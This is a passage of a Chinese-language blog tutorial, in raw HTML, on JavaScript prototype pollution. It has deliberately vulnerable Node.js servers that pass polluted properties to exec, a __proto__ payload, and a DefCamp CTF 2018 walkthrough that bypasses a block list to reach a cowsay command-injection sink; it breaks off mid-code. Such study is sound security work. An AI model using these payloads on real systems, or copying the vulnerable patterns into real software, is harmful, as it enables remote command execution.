src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"10.png\"></p>\n<p>或者是两个参数：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/11.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"11.png\"></p>\n<p>这是一种通过已实例化的对象来进行回溯原型污染，还可以是下面这种直接操作构造函数的形式：</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/12.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"12\"></p>\n<p>当我们可操控的对象不是最终 Object 构造函数形成的时候，我们可以使用 testObj.__proto__.__proto__ 这种方法来回溯。</p>\n<p>下面给出一个测试例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> url = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'url'</span>);<br><span class=\"hljs-keyword\">var</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<br><span class=\"hljs-keyword\">var</span> fs = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'fs'</span>);<br><span class=\"hljs-keyword\">var</span> exec = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'child_process'</span>).exec;<br><br>http.createServer(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">req,res</span>)</span>&#123;<br>        <span class=\"hljs-keyword\">var</span> req_url = req.url;<br>        <span class=\"hljs-keyword\">var</span> str_url = url.parse(req_url,<span class=\"hljs-literal\">true</span>).query;<br>        <span class=\"hljs-keyword\">var</span> path1 = <span class=\"hljs-built_in\">String</span>(str_url.pathname1);<br>        <span class=\"hljs-keyword\">var</span> path2 = <span class=\"hljs-built_in\">String</span>(str_url.pathname2);<br>        <span class=\"hljs-keyword\">var</span> value = <span class=\"hljs-built_in\">String</span>(str_url.value);<br>        <span class=\"hljs-keyword\">var</span> obj = &#123;<span class=\"hljs-attr\">earth</span>:&#123;<span class=\"hljs-attr\">country</span>:<span class=\"hljs-string\">'UK'</span>&#125;&#125;;<br>        obj[path1][path2] = value;<br>        <span class=\"hljs-built_in\">console</span>.log(obj)<br>        <span class=\"hljs-keyword\">var</span> test = &#123;&#125;;<br>        exec(test.vul,<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err,data,stderr</span>)</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(err)&#123;<br>                <span class=\"hljs-built_in\">console</span>.log(stderr);<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span>&#123;<br>                <span class=\"hljs-built_in\">console</span>.log(data);<br>        &#125;<br>&#125;)&#125;).listen(<span class=\"hljs-number\">1234</span>);<br></code></pre></td></tr></table></figure>\n\n<p>客户端：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">form</span> <span class=\"hljs-attr\">action</span>=<span class=\"hljs-string\">'http://127.0.0.1:1234'</span> <span class=\"hljs-attr\">method</span>=<span class=\"hljs-string\">\"get\"</span>&gt;</span><br>pathname1:<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"text\"</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"pathname1\"</span>&gt;</span> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><br>pathname2:<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"text\"</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"pathname2\"</span>&gt;</span> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><br>value   :<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type:</span>\"<span class=\"hljs-attr\">text</span>\" <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"value\"</span>&gt;</span> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">'submit'</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">'submit'</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">form</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>我们访问客户端来构造利用 payload :</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">pathname1</span> = __proto__<br><span class=\"hljs-attr\">pathname2</span> = a<br><span class=\"hljs-attr\">value</span> = command<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/13.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"13\"></p>\n<h3 id=\"2、控制了路径赋值参数\"><a href=\"#2、控制了路径赋值参数\" class=\"headerlink\" title=\"2、控制了路径赋值参数\"></a>2、控制了路径赋值参数</h3><p>有的 api 里面有通过传入路径来给对象属性赋值的方法，如果部分参数可控，便可以达到原型链污染的目的，沿用上面的代码例子，我们引入 pathval 这个第三方 api，通过里面的 setPathVal 方法，来触发原型链污染的漏洞：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 服务端</span><br><span class=\"hljs-keyword\">var</span> url = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'url'</span>);<br><span class=\"hljs-keyword\">var</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<br><span class=\"hljs-keyword\">var</span> fs = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'fs'</span>);<br><span class=\"hljs-keyword\">var</span> exec = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'child_process'</span>).exec;<br><span class=\"hljs-keyword\">var</span> pathval = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'pathval'</span>);<br>http.createServer(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">req,res</span>)</span>&#123;<br>        <span class=\"hljs-keyword\">var</span> req_url = req.url;<br>        <span class=\"hljs-keyword\">var</span> str_url = url.parse(req_url,<span class=\"hljs-literal\">true</span>).query;<br>        <span class=\"hljs-keyword\">var</span> path1 = <span class=\"hljs-built_in\">String</span>(str_url.pathname1);<br>        <span class=\"hljs-keyword\">var</span> value = <span class=\"hljs-built_in\">String</span>(str_url.value);<br>        <span class=\"hljs-keyword\">var</span> obj = &#123;<span class=\"hljs-attr\">earth</span>:&#123;<span class=\"hljs-attr\">country</span>:<span class=\"hljs-string\">'UK'</span>&#125;&#125;;<br>        pathval.setPathValue(obj,path1,value)<br>        <span class=\"hljs-keyword\">var</span> test = &#123;&#125;;<br>        exec(test.vul,<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err,data,stderr</span>)</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(err)&#123;<br>                <span class=\"hljs-built_in\">console</span>.log(stderr);<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span>&#123;<br>                <span class=\"hljs-built_in\">console</span>.log(data);<br>        &#125;<br>&#125;)&#125;).listen(<span class=\"hljs-number\">1234</span>);<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/14.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"14\"></p>\n<h3 id=\"3、对象克隆\"><a href=\"#3、对象克隆\" class=\"headerlink\" title=\"3、对象克隆\"></a>3、对象克隆</h3><p>实质上还是递归进行合并的做法，我们可以用前面分析过的方法理解。下面我们提下一般深层克隆的方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">&lt;script&gt;<br>    <span class=\"hljs-keyword\">var</span> obj = &#123;<br>        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">\"rt95\"</span>,<br>        <span class=\"hljs-attr\">age</span>: <span class=\"hljs-number\">20</span>,<br>        <span class=\"hljs-attr\">monry</span>: <span class=\"hljs-number\">1000</span><br>    &#125;;<br>    <span class=\"hljs-keyword\">var</span> obj1 = &#123;&#125;;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">clone</span>(<span class=\"hljs-params\">origin, target</span>) </span>&#123;<br>        target = target || &#123;&#125;;<br><br>        toStr = <span class=\"hljs-built_in\">Object</span>.prototype.toString;<br>        arrstr = <span class=\"hljs-string\">\"[object Array]\"</span>;<br>        <span class=\"hljs-keyword\">for</span> (prop <span class=\"hljs-keyword\">in</span> origin) &#123;<br>            <span class=\"hljs-keyword\">if</span> (origin.hasOwnProperty(prop)) &#123;<br>                <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">typeof</span>(origin[prop]) === <span class=\"hljs-string\">\"object\"</span>) &#123;<br>                    <span class=\"hljs-keyword\">if</span> (toStr.call(prop) === arrstr) &#123;<br>                        target[prop] = [];<br>                    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                        target[prop] = &#123;&#125;;<br>                    &#125;<br>                    clone(origin[prop], target[prop])<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    target[prop] = origin[prop];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    clone(obj, obj1);<br><span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<p>大致流程就是：</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">1</span>、生成克隆对象 ------&gt;<br><span class=\"hljs-number\">2</span>、判断 origin（被克隆对象）的元素是原始值还是引用值 ------&gt;<br><span class=\"hljs-number\">3</span>、原始值直接进行赋值，引用值需要分情况 ------&gt;<br><span class=\"hljs-number\">4</span>、引用值如果是数组，那么在克隆对象中创建一个空数组，然后递归上面原始值的克隆过程 -----&gt;<br><span class=\"hljs-number\">5</span>、引用值如果是对象，那么在克隆对象中创建一个空对象，然后递归上面原始值的克隆过程。<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>原始值：</p>\n<p>存储在栈（stack）中的简单数据段，也就是说，它们的值直接存储在变量访问的位置。</p>\n<p>引用值：</p>\n<p>存储在堆（heap）中的对象，也就是说，存储在变量处的值是一个指针（point），指向存储对象的内存处。</p>\n</blockquote>\n<ul>\n<li>原始值就是单变量形成的值，值一般是字面量，像整数，字符串等。</li>\n<li>引用值就是对象，数组等结构型的值。</li>\n</ul>\n<p>那么克隆引用值的时候赋给克隆对象的值将会是原对象所指的数据处，那么相当于克隆对象和被克隆对象共有这组值。所以为了实现完全独一份的克隆，我们需要深入到引用值内部元素，然后进行克隆对象新建相应引用值类型数据结构后的逐一赋值。</p>\n<h1 id=\"4-实战题目\"><a href=\"#4-实战题目\" class=\"headerlink\" title=\"4@ 实战题目\"></a>4@ 实战题目</h1><p>题目来源于 DefCamp CTF 2018 ，源码可以<a href=\"https://dctf.def.camp/dctf-18-quals-81249812/chat.zip\" target=\"_blank\" rel=\"noopener\">在这下载</a>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javscript\">// 客户端代码<br>const io = require(&apos;socket.io-client&apos;)<br>const socket = io.connect(&apos;https://chat.dctfq18.def.camp&apos;) // 此处我们可以设为本地测试的地址<br><br>if(process.argv.length != 4) &#123;<br>  console.log(&apos;name and channel missing&apos;)<br>   process.exit()<br>&#125;<br>console.log(&apos;Logging as &apos; + process.argv[2] + &apos; on &apos; + process.argv[3])<br>var inputUser = &#123;<br>  name: process.argv[2],<br>&#125;;<br><br>socket.on(&apos;message&apos;, function(msg) &#123;<br>  console.log(msg.from,&quot;[&quot;, msg.channel!==undefined?msg.channel:&apos;Default&apos;,&quot;]&quot;, &quot;says:\\n&quot;, msg.message);<br>&#125;);<br><br>socket.on(&apos;error&apos;, function (err) &#123;<br>  console.log(&apos;received socket error:&apos;)<br>  console.log(err)<br>&#125;)<br><br>socket.emit(&apos;register&apos;, JSON.stringify(inputUser));<br>socket.emit(&apos;message&apos;, JSON.stringify(&#123; msg: &quot;hello&quot; &#125;));<br>socket.emit(&apos;join&apos;, process.argv[3]);//ps: you should keep your channels private<br>socket.emit(&apos;message&apos;, JSON.stringify(&#123; channel: process.argv[3], msg: &quot;hello channel&quot; &#125;));<br>socket.emit(&apos;message&apos;, JSON.stringify(&#123; channel: &quot;test&quot;, msg: &quot;i own you&quot; &#125;));<br></code></pre></td></tr></table></figure>\n\n<p>从命令行接受进入参数后，然后将序列化后的数据发送到服务端，触发服务端事件。</p>\n<p>在源码包里面我们发现了服务端引用模块文件 helper.js 中有如下执行系统命令的方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">getAscii: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">message</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">var</span> e = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'child_process'</span>);<br>        <span class=\"hljs-keyword\">return</span> e.execSync(<span class=\"hljs-string\">\"cowsay '\"</span> + message + <span class=\"hljs-string\">\"'\"</span>).toString();<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>在服务端代码中定位到使用此方法的位置：在 join 和 leave 事件里面都有使用：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 服务端代码</span><br>.......<br><br>io.on(<span class=\"hljs-string\">'connection'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">client</span>) </span>&#123; <br>    client.on(<span class=\"hljs-string\">'register'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">inUser</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            newUser = helper.clone(<span class=\"hljs-built_in\">JSON</span>.parse(inUser))<br><br>.........<br><br>    client.on(<span class=\"hljs-string\">'join'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">channel</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            clientManager.joinChannel(client, channel);<br>            sendMessageToClient(client,<span class=\"hljs-string\">\"Server\"</span>, <br>                <span class=\"hljs-string\">\"You joined channel\"</span>, channel)<br><br>            <span class=\"hljs-keyword\">var</span> u = clientManager.getUsername(client);<br>            <span class=\"hljs-keyword\">var</span> c = clientManager.getCountry(client);<br><br>            sendMessageToChannel(channel,<span class=\"hljs-string\">\"Server\"</span>, <br>                helper.getAscii(<span class=\"hljs-string\">\"User \"</span> + u + <span class=\"hljs-string\">\" living in \"</span> + c + <span class=\"hljs-string\">\" joined channel\"</span>))<br>        &#125; <span class=\"hljs-keyword\">catch</span>(e) &#123; <span class=\"hljs-built_in\">console</span>.log(e); client.disconnect() &#125;<br>    &#125;);<br><br>    client.on(<span class=\"hljs-string\">'leave'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">channel</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            client .join(channel);<br>            clientManager.leaveChannel(client, channel);<br>            sendMessageToClient(client,<span class=\"hljs-string\">\"Server\"</span>, <br>                <span class=\"hljs-string\">\"You left channel\"</span>, channel)<br><br>            <span class=\"hljs-keyword\">var</span> u = clientManager.getUsername(client);<br>            <span class=\"hljs-keyword\">var</span> c = clientManager.getCountry(client);<br>            sendMessageToChannel(channel, <span class=\"hljs-string\">\"Server\"</span>, <br>                helper.getAscii(<span class=\"hljs-string\">\"User \"</span> + u + <span class=\"hljs-string\">\" living in \"</span> + c + <span class=\"hljs-string\">\" left channel\"</span>))<br>        &#125; <span class=\"hljs-keyword\">catch</span>(e) &#123; <span class=\"hljs-built_in\">console</span>.log(e); client.disconnect() &#125;<br>    &#125;);<br>server.listen(<span class=\"hljs-number\">3000</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">err</span>) </span>&#123;<br>  <span class=\"hljs-keyword\">if</span> (err) <span class=\"hljs-keyword\">throw</span> err;<br>  <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'listening on port 3000'</span>);  <span class=\"hljs-comment\">// 这里的端口也可以改为本地测试端口</span><br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<p>参数 u 和 c 是通过模块 clientManager 中的 getUsername 方法和 getCountry 方法得到，跟进到 clientManager.js 文件中：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">getUsername: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">client</span>) </span>&#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.clients[client.id].u.name;<br>  &#125;,<br><span class=\"hljs-attr\">getCountry</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">client</span>) </span>&#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.clients[client.id].u.country;<br>  &#125;<br></code></pre></td></tr></table></figure>\n\n<p>直接返回原先服务端注册生成的用户信息，我们来看看那个方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">clientManager.registerClient(client, newUser); <span class=\"hljs-comment\">// newUser 就是客户端传来的经过 clone 和 JSON.parse() 处理的数据。</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// clientManager.js</span><br><span class=\"hljs-attr\">registerClient</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">client, user</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.clients[client.id] = &#123; <span class=\"hljs-string\">'c'</span>: client,<br>                                    <span class=\"hljs-string\">'u'</span>: user,<br>                                    <span class=\"hljs-string\">'ch'</span>: &#123;&#125;<br>        &#125;;<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>所以上面的 getAscii 方法中的 u 就是我们客户端传入的经过处理的数据，只需让这个对象的 country 属性变得可利用即可，那么可以直接赋值吗？很可惜被黑名单过滤了：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// helper.js</span><br> <span class=\"hljs-attr\">validUser</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">inp</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">var</span> block = [<span class=\"hljs-string\">\"source\"</span>,<span class=\"hljs-string\">\"port\"</span>,<span class=\"hljs-string\">\"font\"</span>,<span class=\"hljs-string\">\"country\"</span>,<br>                     <span class=\"hljs-string\">\"location\"</span>,<span class=\"hljs-string\">\"status\"</span>,<span class=\"hljs-string\">\"lastname\"</span>];<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">typeof</span> inp !== <span class=\"hljs-string\">'object'</span>) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>        &#125;<br></code></pre></td></tr></table></figure>\n\n<p>被检测函数的黑名单过滤了，那么就不能直接给 country 属性赋值了，但是我们可以放到其原型里面，所以下面我们就来看看另一个处理传入数据的函数，clone() : </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">&lt;script&gt;<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">clone</span>(<span class=\"hljs-params\">obj</span>) </span>&#123;<br><br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">typeof</span> obj !== <span class=\"hljs-string\">'object'</span> || obj === <span class=\"hljs-literal\">null</span>) &#123;<br><br>            <span class=\"hljs-keyword\">return</span> obj;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">var</span> newObj;<br>        <span class=\"hljs-keyword\">var</span> cloneDeep = <span class=\"hljs-literal\">false</span>;<br><br>    ......<br>            else &#123;<br>                <span class=\"hljs-keyword\">var</span> proto = <span class=\"hljs-built_in\">Object</span>.getPrototypeOf(obj);<br>                <span class=\"hljs-keyword\">if</span> (proto &amp;&amp; proto.isImmutable) &#123;<br>\t\t\t\t<br>                    newObj = obj;<br>                &#125;<br>                <span class=\"hljs-keyword\">else</span> &#123;<br>                    newObj = <span class=\"hljs-built_in\">Object</span>.create(proto);<br>                    cloneDeep = <span class=\"hljs-literal\">true</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            newObj = [];<br>            cloneDeep = <span class=\"hljs-literal\">true</span>;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">if</span> (cloneDeep) &#123;<br>            <span class=\"hljs-keyword\">var</span> keys = <span class=\"hljs-built_in\">Object</span>.getOwnPropertyNames(obj);<br><br>            <br>            <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">var</span> i = <span class=\"hljs-number\">0</span>; i &lt; keys.length; ++i) &#123;<br>                <span class=\"hljs-keyword\">var</span> key = keys[i];<br>                <span class=\"hljs-keyword\">var</span> descriptor = <span 